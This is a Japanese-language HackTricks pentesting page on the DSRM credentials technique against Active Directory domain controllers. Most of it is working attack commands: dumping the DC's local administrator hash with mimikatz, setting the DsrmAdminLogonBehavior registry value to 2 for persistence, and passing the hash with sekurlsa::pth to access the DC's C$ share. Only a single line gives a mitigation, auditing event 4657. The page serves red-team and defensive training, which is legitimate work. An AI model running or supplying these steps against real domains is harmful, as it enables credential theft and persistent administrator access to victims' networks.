{{#include ../../banners/hacktricks-training.md}}

# DSRM 認証情報

各 **DC** には **ローカル管理者** アカウントがあります。このマシンで管理者権限を持っていると、mimikatz を使用して **ローカル管理者ハッシュ** を **ダンプ** できます。その後、レジストリを変更してこのパスワードを **有効化** し、リモートでこのローカル管理者ユーザーにアクセスできるようにします。\
まず、DC 内の **ローカル管理者** ユーザーの **ハッシュ** を **ダンプ** する必要があります:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
そのアカウントが機能するかどうかを確認し、レジストリキーの値が「0」であるか存在しない場合は、**「2」に設定する必要があります**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
その後、PTHを使用して**C$の内容をリストしたり、シェルを取得したりできます**。そのハッシュをメモリ内で使用して新しいPowerShellセッションを作成する際（PTH用）には、**使用される「ドメイン」はDCマシンの名前だけです。**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
より詳しい情報は次のリンクを参照してください: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) と [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## 緩和策

- イベント ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` の作成/変更の監査

{{#include ../../banners/hacktricks-training.md}}
